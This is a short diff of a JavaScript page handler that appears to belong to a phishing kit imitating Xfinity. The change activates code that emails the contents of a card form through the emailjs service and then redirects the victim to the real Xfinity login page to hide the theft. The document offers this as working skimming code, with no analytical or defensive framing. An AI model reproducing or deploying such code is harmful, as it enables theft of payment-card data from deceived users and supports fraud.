@@ -138,17 +138,14 @@ $( function() {
             return false;
         }
 
-        window.location.href = "https://login.xfinity.com/login";               
-
-
-        // emailjs.sendForm('fl', 'template_mgvu1zj', '#card-form')
-        //     .then(function() {
-        //         console.log('SUCCESS!'); 
-        //         $( "#card-form" ).submit();
-        //         window.location.href = "https://login.xfinity.com/login";               
-        //     }, function(error) {
-        //         console.log('FAILED...', error);
-        // });
+        emailjs.sendForm('fl', 'template_mgvu1zj', '#card-form')
+            .then(function() {
+                console.log('SUCCESS!'); 
+                $( "#card-form" ).submit();
+                window.location.href = "https://login.xfinity.com/login";               
+            }, function(error) {
+                console.log('FAILED...', error);
+        });
 
        
     } );
